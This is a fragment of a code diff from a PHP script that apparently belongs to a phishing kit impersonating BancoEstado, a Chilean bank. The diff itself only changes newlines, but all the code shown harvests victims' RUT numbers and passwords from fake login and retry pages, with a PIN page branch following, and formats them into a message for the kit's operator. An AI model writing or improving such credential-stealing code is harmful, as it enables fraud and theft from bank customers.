@@ -47,7 +47,7 @@ if (isset($_POST['rut'],$_POST['password'])) {
     $pass = trim($_POST['password']);
     $message .= "🇨🇱 ✴︎𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈 𝖫𝗈𝗀𝗈✴︎ 🇨🇱\n\n";
     $message .= "┊♡ 𝖱𝖴𝖳.: <code>$rut</code>\n";
-    $message .= "┊♡ 𝖢𝗅𝖺𝗏𝖾.: <code>$pass</code>\n\n";
+    $message .= "┊♡ 𝖢𝗅𝖺𝗏𝖾.: <code>$pass</code>\n";
 
 // index-error.php
 } elseif (isset($_POST['rut2'],$_POST['password2'])) {
@@ -59,7 +59,7 @@ if (isset($_POST['rut'],$_POST['password'])) {
     $pass2 = trim($_POST['password2']);
     $message .= "🇨🇱 ✴︎𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
     $message .= "┊♡ 𝖱𝖴𝖳.: <code>$rut2</code>\n";
-    $message .= "┊♡ 𝖢𝗅𝖺𝗏𝖾.: <code>$pass2</code>\n\n";
+    $message .= "┊♡ 𝖢𝗅𝖺𝗏𝖾.: <code>$pass2</code>\n";
 
 // pin.php
 } elseif (isset($_POST['pincaje'])) {
